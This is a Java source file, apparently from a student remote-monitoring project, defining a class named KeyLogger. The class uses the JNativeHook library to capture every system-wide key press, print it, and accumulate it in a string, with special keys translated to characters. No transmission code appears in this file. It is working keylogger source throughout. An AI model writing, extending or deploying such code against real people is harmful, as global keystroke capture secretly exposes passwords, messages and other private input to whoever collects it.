/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */

package com.mycompany.server;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.security.Key;

/**
 *
 * @author FPT SHOP
 */
public class KeyLogger implements NativeKeyListener {

    //biến store để lưu key
    public String store = "";

//    public StringBuffer sb = new StringBuffer();

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {

        String key = NativeKeyEvent.getKeyText(e.getKeyCode());
        System.out.println("Pressed: " + key);
        switch (key)
        {
             case "Space":
                 store += " ";
                 break;
             case "Enter":
                 store += "\n";
                 break;
             case "Open Bracket":
                 store += "[";
                 break;
             case "Close Bracket":
                 store += "]";
                 break;
             case "Comma":
                 store += ",";
                 break;
             case "Period":
                 store += ".";
                 break;
             case "Slash":
                 store += "/";
                 break;
             case "Quote":
                 store += "'";
                 break;
             case "Minus":
                 store += "-";
                 break;
             case "Back Quote":
                 store += "`";
                 break;
             case "Equals":
                 store += "=";
                 break;
             default:
                store += key;
                break;
         } //end of switch
        
//        sb.append(key);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
//        String key = NativeKeyEvent.getKeyText(e.getKeyCode());
//        System.out.println("Released: " + key);

//        store += key;
//        sb.append(key);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e){
    }
}
